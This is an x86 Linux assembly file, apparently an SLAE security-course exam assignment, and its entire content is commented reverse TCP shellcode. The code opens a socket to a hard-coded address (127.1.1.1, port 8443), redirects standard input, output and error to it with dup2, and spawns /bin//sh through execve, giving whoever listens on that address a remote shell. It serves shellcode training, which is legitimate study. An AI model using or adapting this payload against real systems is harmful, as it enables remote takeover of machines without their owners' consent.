; SLAE Exam Assignment #2: Shell Reverse TCP shellcode 
; Author: Rikih Gunawan

global _start

section .text

_start:
    ; zeroing the registers
    xor ecx, ecx        ; ecx = 0
    mul ecx             ; eax = 0
    cdq                 ; xor edx, edx

socket:
    ; create a socket
    ; server_sock = socket(AF_INET, SOCK_STREAM, 0);
    ; 
    ; eax : socketcall = 102 ~ 0x66
    ; ebx : SYS_SOCKET = 1 ~ 0x01
    ; ecx : args = esp (AF_INET = 0x02, SOCK_STREAM = 0x01, PROTOCOL = 0x00)
    ;
    ; socketcall
    push byte 0x66      ; socketcall 102 ~ 0x66 
    pop eax             ; eax = 0x66
    push byte 0x01      ; SYS_SOCKET = 1
    pop ebx             ; ebx = 0x1

    ; parameters for socket 
    ;
    ; (AF_INET, SOCK_STREAM, protocol)
    ; stack:
    ;   ecx => esp
    ;   0x02  - AF_INET
    ;   0x01  - SOCK_STREAM
    ;   0x00  - protocol   
    ; socket args            
    push ecx            ; ecx = 0
    push byte 0x01      ; SOCK_STREAM = 0x01
    push byte 0x02      ; AF_INET = 0x02 
    mov ecx, esp        ; copy arguments on the stack to ecx
    int 0x80            ; return sockfd to eax

    ; store return sockfd on eax to edi
    ; that will be use for next instruction
    xchg edi, eax       ; store return sockfd on eax to edi

connect:
    ; initiate a connection on a socket
    ; socketcall
    push byte 0x66      ; socketcall = 102 ~ 0x66
    pop eax             ; eax = 0x66
    push byte 0x03      ; SYS_CONNECT = 3 ~ 0x03
    pop ebx             ; ebx = 0x03

    ;>>> "".join([ hex(int(y))[2:].zfill(2) for y in '127.1.1.1'.split('.')[::-1] ])
    ;'0101017f'
    ; struct sockaddr_in
    push 0x0101017f     ; 127.1.1.1
    push word 0xfb20    ; PORT 8443  ~ 0x20fb - in reverse network byte order 0xfb20
    push word 0x02      ; AF_INET = 2 ~ 0x02 
    mov ecx, esp        ; ecx pointing to top of stack esp  

    ; connect arg
    ; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
    push byte 0x10      ; sizeof sockaddr = 16 ~ 0x10
    push ecx            ; &server_addr
    push edi            ; sockfd
    mov ecx, esp        ; ecx pointing to top of stack esp  
    int 0x80

    xor ecx, ecx        ; zeroing ecx
    push byte 0x02
    pop ecx             ; ecx = 0x02

    push edi
    pop ebx

; Duplicate stdin/stdout/stderr to client socket
;
; dup2(new_sock, 0) - stdin
; dup2(new_sock, 1) - stdout
; dup2(new_sock, 2) - stderr
;
; al  = 0x3f
; ebx = client socket new_sock
; ecx = 0x2 => 2, 1, 0 - counter
dup2:
    ; dup2
    mov al, 0x3f        ; dup2 = 63 ~ 0x3f
    int 0x80
    dec ecx             ; 2, 1, 0
    jns dup2            ; continue to jump to dump2 label (loop) until the signed flag is set

; execve(SHELL, NULL, NULL);
execve:
    ; execve
    push byte 0x0b      ; execve = 11 ~ 0x0b
    pop eax             ; eax = 0x0b

    ; arg execve(SHELL, NULL, NULL);
    xor ecx, ecx        ; ecx = 0
    push ecx            ; null
    push ecx            ; null
    push 0x68732f2f     ; "hs//""
    push 0x6e69622f     ; "nib/"
    mov ebx, esp        ; copy arguments on the stack to ecx
    int 0x80
